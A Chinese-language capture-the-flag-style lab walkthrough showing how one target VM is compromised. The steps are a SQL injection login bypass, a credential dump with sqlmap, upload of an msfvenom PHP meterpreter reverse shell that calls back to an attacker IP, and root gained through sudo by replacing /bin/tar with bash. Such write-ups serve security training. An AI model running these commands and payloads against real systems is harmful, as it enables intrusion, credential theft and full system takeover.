
# 环境
攻击机IP：192.168.1.10<br />目标机IP：192.168.1.17


# 实战
使用NMAP扫描端口，可以看到只开放了一个80端口
```
nmap -Pn -sV 192.168.1.17
```
![image.png](../../_img\06-靶场实践/1657691498343-c378d19b-7cf8-45e5-8074-47793f766110.png)

访问Web服务显示`You must login to access restricted content`
![image.png](../../_img\06-靶场实践/1657691502505-b42d1c2d-e962-4bc7-9e53-e03304171dbc.png)

尝试使用万能密码`' or 1=1 #`登录，登录成功
![image.png](../../_img\06-靶场实践/1657691507396-b9277167-679f-4415-8d59-13d788ecc827.png)

在浏览网页中发现存在文件上传，尝试上传shell.php木马文件<br />生成木马文件，将得到的木马代码复制到文本中并命名位shell.php

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f raw
```
![image.png](../../_img\06-靶场实践/1657691513293-685edf14-f61f-4740-a26b-fcff50865996.png)

上传失败显示`已禁用用户alamo的主目录上载`
![image.png](../../_img\06-靶场实践/1657691544433-5d14c166-45ee-4de5-8744-c65189db9c9c.png)

那么我们就需要找一个拥有上传权限的用户，在前面我们知道登录页面存在SQL注入，尝试使用SQLMAP爆库，使用burp抓包，将数据保存到2.txt中
![image.png](../../_img\06-靶场实践/1657691563728-70f0745b-5824-4c17-ad91-184d2b307383.png)

```
sqlmap -r 2.txt -dbs
```
![image.png](../../_img\06-靶场实践/1657691568285-638944cd-5037-461c-84e1-4374b9f8e217.png)

经过查找在creds库中的accounts表中存在username和password字段
```
sqlmap -r 2.txt -D creds -T accounts --columns
```
![image.png](../../_img\06-靶场实践/1657691573159-b9f09c65-6d01-4c01-9cff-5ee4d4e20beb.png)

得到账号和密码
```
sqlmap -r 2.txt -D creds -T accounts -C username,password --dump
```
![image.png](../../_img\06-靶场实践/1657691578258-4bd42c05-e58b-41ad-9b7d-7b71ac36ff86.png)

尝试使用jjames账号登录上传shell.php木马文件，成功上传
![image.png](../../_img\06-靶场实践/1657691582169-f7e14df3-3141-4f24-a9dd-d6ea3f3b90b5.png)

找了很久没有找到上传文件所在的路径，尝试重新上传，这时我注意到在上传界面有`Enable the automatic extraction of gzip archives.(启用gzip存档的自动提取。)`，这次我们尝试将其勾选，上传压缩包然后自动提取文件。
```
tar -zcvf shell.tar.gz shell.php     --压缩shell.php
```
![image.png](../../_img\06-靶场实践/1657691586118-a163f069-3840-455b-a4fb-54c4383457db.png)

依然是找了很久没有找到上传文件所在的目录，然后我发现在文件上传页面的标题`Home directory uploader(主目录上载程序)`，主目录，那么可能是将文件上传到了用户的主目录，尝试浏览`http://192.168.1.17/~jjames/`，果然找到了所上传的文件。
![image.png](../../_img\06-靶场实践/1657691590046-ae5305c1-f2ca-4e36-b3ce-e147c6fd5a6f.png)

使用MSF启动监听
```
root@kali-xmtx:~/桌面#msfconsole                                           --启动MSF
msf6 > use exploit/multi/handler                                           --选择模块
exploit(multi/handler) > set payload php/meterpreter/reverse_tcp           --设置payload
msf6 exploit(multi/handler) > set lhost 192.168.1.10                       --设置IP
msf6 exploit(multi/handler) > set lport 4444                               --设置端口
msf6 exploit(multi/handler) > run                                          --运行
```
![image.png](../../_img\06-靶场实践/1657691594817-067d8eaa-6c7e-4beb-9f5f-eb7310e910cb.png)

在Web页面点击上传的木马，成功反弹shell(注意：此处的木马文件必须是打包上传的，否则无法执行)
![image.png](../../_img\06-靶场实践/1657691600314-db8b9c4b-0f86-4b3a-becf-17e376dd0d22.png)

进入shell输入`python -c 'import pty;pty.spawn("/bin/bash")'`使界面变得正常，查看权限
![image.png](../../_img\06-靶场实践/1657691604839-afab33ad-fca7-4af7-b1c9-cfee6f7fb9b4.png)

使用`sudo -l`命令，可以看到有多个命令将允许用户www-data以root身份进行sudo
![image.png](../../_img\06-靶场实践/1657691609118-1d2f3b1d-bdbc-48c7-8e61-7e3d59f7767a.png)

转到`/tmp`目录，将`/bin/bash`文件复制到`/tmp`文件夹，更改文件`/tmp/bash`的所有权，以便从此以后的根成为所有者
![image.png](../../_img\06-靶场实践/1657691612868-c504a0dd-21d0-4997-9659-a11c8d96827a.png)

将现有的`/bin/tar`文件备份到`bin/tar.bak`，然后将`/tmp/bash`文件移动到`/bin/tar`，执行命令/bin/tar
![image.png](../../_img\06-靶场实践/1657691616760-a5f1c43b-1856-4184-a94a-e0d3d796979e.png)

查看权限，成功获取到root权限
![image.png](../../_img\06-靶场实践/1657691620921-700c9c4a-86ec-4466-868a-94c4828d2cee.png)
